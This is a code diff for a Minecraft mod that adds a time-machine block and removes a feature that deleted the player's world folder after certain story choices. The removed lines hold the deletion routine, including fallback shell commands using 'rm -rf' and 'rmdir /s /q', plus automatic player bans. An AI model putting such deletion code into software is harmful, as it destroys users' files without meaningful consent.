@@ -43,6 +43,8 @@ import net.multyfora.don.block.MysticBrazierBlock;
 import net.multyfora.don.block.MysticBrazierBlockEntity;
 import net.multyfora.don.block.PortableStarBlock;
 import net.multyfora.don.block.PortableStarBlockEntity;
+import net.multyfora.don.block.TimeMachineBlock;
+import net.multyfora.don.block.TimeMachineBlockEntity;
 import net.multyfora.don.block.SingularityCrystalBlock;
 import net.multyfora.don.block.SingularityCrystalDrain;
 import net.multyfora.don.block.SoulLightBlockEntity;
@@ -117,9 +119,10 @@ import java.util.UUID;
 public class don {
     public static final String MODID = "don";
     public static final Logger LOGGER = LogUtils.getLogger();
-    private static volatile java.nio.file.Path pendingWorldDeletion = null;
     private static final Map<UUID, Boolean> labMusicState = new HashMap<>();
     public static final String BETRAYED_TAG = "don:betrayed_brightest";
+    public static final String HELPED_TAG = "don:helped_nayir";
+    public static final String HELPED_MESSAGE_SHOWN_TAG = "don:helped_nayir_message_shown";
     private static final Map<UUID, Long> pendingHeroDeletion = new HashMap<>();
     public static final DeferredRegister.Blocks BLOCKS = DeferredRegister.createBlocks(MODID);
     public static final DeferredRegister.Items ITEMS = DeferredRegister.createItems(MODID);
@@ -214,6 +217,19 @@ public class don {
         BLOCK_ENTITY_TYPES.register(
             "portable_star",
             () -> new BlockEntityType<>(PortableStarBlockEntity::new, Set.of(PORTABLE_STAR_BLOCK.get()))
+        );
+
+    public static final DeferredBlock<TimeMachineBlock> TIME_MACHINE_BLOCK = BLOCKS.registerBlock(
+        "time_machine",
+        TimeMachineBlock::new,
+        p -> p.mapColor(MapColor.COLOR_YELLOW).strength(3.0f).sound(SoundType.AMETHYST).noOcclusion().requiresCorrectToolForDrops()
+    );
+    public static final DeferredItem<BlockItem> TIME_MACHINE_ITEM = ITEMS.registerSimpleBlockItem("time_machine", TIME_MACHINE_BLOCK);
+
+    public static final DeferredHolder<BlockEntityType<?>, BlockEntityType<TimeMachineBlockEntity>> TIME_MACHINE_BLOCK_ENTITY =
+        BLOCK_ENTITY_TYPES.register(
+            "time_machine",
+            () -> new BlockEntityType<>(TimeMachineBlockEntity::new, Set.of(TIME_MACHINE_BLOCK.get()))
         );
 
     public static final DeferredBlock<LightConduitBlock> LIGHT_CONDUIT_BLOCK = BLOCKS.registerBlock(
@@ -412,13 +428,19 @@ public class don {
                     if (hasBetrayed(player)) return;
                     BlockPos pos = payload.pos();
                     if (pos.distToCenterSqr(player.position()) > 36.0) return;
-                    if (!level.getBlockState(pos).is(PORTABLE_STAR_BLOCK.get())) return;
+                    var state = level.getBlockState(pos);
+                    boolean isPortable = state.is(PORTABLE_STAR_BLOCK.get());
+                    boolean isTimeMachine = state.is(TIME_MACHINE_BLOCK.get());
+                    if (!isPortable && !isTimeMachine) return;
                     if (!isPlayerInLab(player)) return;
-                    if (!level.getBlockState(pos.below()).is(Blocks.GOLD_BLOCK)) return;
-                    var tinted = Blocks.TINTED_GLASS;
-                    if (!(level.getBlockState(pos.north()).is(tinted) && level.getBlockState(pos.south()).is(tinted) && level.getBlockState(pos.east()).is(tinted) && level.getBlockState(pos.west()).is(tinted))) return;
+                    if (isPortable) {
+                        if (!level.getBlockState(pos.below()).is(Blocks.GOLD_BLOCK)) return;
+                        var tinted = Blocks.TINTED_GLASS;
+                        if (!(level.getBlockState(pos.north()).is(tinted) && level.getBlockState(pos.south()).is(tinted) && level.getBlockState(pos.east()).is(tinted) && level.getBlockState(pos.west()).is(tinted))) return;
+                    }
                     if (payload.help()) {
                         PacketDistributor.sendToPlayer(player, new DialogueEventStartPayload(java.util.List.of("thank you, friend...")));
+                        player.getPersistentData().putBoolean(HELPED_TAG, true);
                         pendingHeroDeletion.put(player.getUUID(), level.getGameTime() + 60);
                     } else {
                         PacketDistributor.sendToPlayer(player, new DialogueEventStartPayload(java.util.List.of("huh... what?")));
@@ -432,6 +454,8 @@ public class don {
                         }
                         labMusicState.put(player.getUUID(), false);
                     }
+                } else {
+                    LOGGER.warn("[SealedSunChoice] context player not ServerPlayer/level");
                 }
             }
         );
@@ -474,19 +498,8 @@ public class don {
             RefuseDealPayload.TYPE,
             RefuseDealPayload.STREAM_CODEC,
             (payload, context) -> {
-                if (context.player() instanceof ServerPlayer player && player.level() instanceof ServerLevel serverLevel) {
-                    var server = serverLevel.getServer();
+                if (context.player() instanceof ServerPlayer player) {
                     player.connection.disconnect(net.minecraft.network.chat.Component.literal("you were deemed unworthy to save Nayir"));
-                    if (server.isDedicatedServer()) return;
-
-                    var worldPath = server.getWorldPath(net.minecraft.world.level.storage.LevelResource.ROOT)
-                        .toAbsolutePath().normalize();
-                    pendingWorldDeletion = worldPath;
-
-                    server.execute(() -> {
-                        for (var lvl : server.getAllLevels()) lvl.noSave = true;
-                        server.halt(false);
-                    });
                 }
             }
         );
@@ -546,6 +559,7 @@ public class don {
         LightEnergyManager.registerSource(MYSTIC_BRAZIER_BLOCK.get(), 0.5, 2.0,
             state -> state.getValue(MysticBrazierBlock.LIT));
         LightEnergyManager.registerSource(PORTABLE_STAR_BLOCK.get(), 1000.0, 0.0);
+        LightEnergyManager.registerSource(TIME_MACHINE_BLOCK.get(), 1000.0, 0.0);
     }
 
     @SubscribeEvent
@@ -575,25 +589,7 @@ public class don {
                     it.remove();
                     var player = event.getServer().getPlayerList().getPlayer(entry.getKey());
                     if (player != null) {
-                        var server = event.getServer();
-                        if (server.isDedicatedServer()) {
-                            try {
-                                var bans = server.getPlayerList().getBans();
-                                var nameAndId = new net.minecraft.server.players.NameAndId(player.getUUID(), player.getName().getString());
-                                bans.add(new net.minecraft.server.players.UserBanListEntry(nameAndId, null, "You are a hero", null, null));
-                                player.connection.disconnect(Component.literal("You are a hero"));
-                            } catch (Exception e) {
-                                player.connection.disconnect(Component.literal("You are a hero"));
-                            }
-                        } else {
-                            player.connection.disconnect(Component.literal("You are a hero"));
-                            var worldPath = server.getWorldPath(net.minecraft.world.level.storage.LevelResource.ROOT).toAbsolutePath().normalize();
-                            pendingWorldDeletion = worldPath;
-                            server.execute(() -> {
-                                for (var lvl : server.getAllLevels()) lvl.noSave = true;
-                                server.halt(false);
-                            });
-                        }
+                        player.connection.disconnect(Component.literal("You are a hero"));
                     }
                 }
             }
@@ -633,6 +629,10 @@ public class don {
                 PacketDistributor.sendToPlayer(player, new BetrayedPayload());
                 PacketDistributor.sendToPlayer(player, new LabMusicPayload(false));
             }
+            if (player.getPersistentData().getBoolean(HELPED_TAG).orElse(false) && !player.getPersistentData().getBoolean(HELPED_MESSAGE_SHOWN_TAG).orElse(false)) {
+                player.sendSystemMessage(Component.literal("this was supposed to delete your world, but curseforge didnt want me to, since it could a security concern, so please pretend that this world is deleted"));
+                player.getPersistentData().putBoolean(HELPED_MESSAGE_SHOWN_TAG, true);
+            }
         }
     }
 
@@ -649,6 +649,8 @@ public class don {
         copyPersistentBoolean(oldData, newData, "don:entered_first_contact");
         copyPersistentBoolean(oldData, newData, "don:accepted_deal");
         copyPersistentBoolean(oldData, newData, BETRAYED_TAG);
+        copyPersistentBoolean(oldData, newData, HELPED_TAG);
+        copyPersistentBoolean(oldData, newData, HELPED_MESSAGE_SHOWN_TAG);
         labMusicState.remove(event.getEntity().getUUID());
         labMusicState.remove(event.getOriginal().getUUID());
     }
@@ -667,48 +669,5 @@ public class don {
         }
     }
 
-    @SubscribeEvent
-    public void onServerStopped(net.neoforged.neoforge.event.server.ServerStoppedEvent event) {
-        var path = pendingWorldDeletion;
-        if (path == null) return;
-        pendingWorldDeletion = null;
-        deleteWorldFolder(path);
-    }
 
-    private static void deleteWorldFolder(java.nio.file.Path root) {
-        if (tryDeleteTree(root, 5)) {
-            LOGGER.warn("World folder deleted after refusing Brightest's deal: {}", root);
-            return;
-        }
-        try {
-            String os = System.getProperty("os.name", "").toLowerCase(java.util.Locale.ROOT);
-            ProcessBuilder pb = os.contains("win")
-                ? new ProcessBuilder("cmd", "/c", "ping 127.0.0.1 -n 4 > nul & rmdir /s /q \"" + root + "\"")
-                : new ProcessBuilder("sh", "-c", "sleep 3; rm -rf '" + root + "'");
-            pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
-            pb.redirectError(ProcessBuilder.Redirect.DISCARD);
-            pb.start();
-            LOGGER.warn("World folder not fully gone yet, handed off to fallback process: {}", root);
-        } catch (Exception e) {
-            LOGGER.error("Fallback world-delete process failed to start for {}", root, e);
-        }
-    }
-
-    private static boolean tryDeleteTree(java.nio.file.Path root, int attempts) {
-        for (int attempt = 0; attempt < attempts; attempt++) {
-            if (!java.nio.file.Files.exists(root)) return true;
-            try (var walk = java.nio.file.Files.walk(root)) {
-                walk.sorted(java.util.Comparator.comparingInt((java.nio.file.Path p) -> p.getNameCount()).reversed())
-                    .forEach(p -> {
-                        try {
-                            p.toFile().setWritable(true);
-                            java.nio.file.Files.deleteIfExists(p);
-                        } catch (Exception ignored) {}
-                    });
-            } catch (Exception ignored) {}
-            if (!java.nio.file.Files.exists(root)) return true;
-            try { Thread.sleep(150); } catch (InterruptedException ignored) {}
-        }
-        return !java.nio.file.Files.exists(root);
-    }
 }
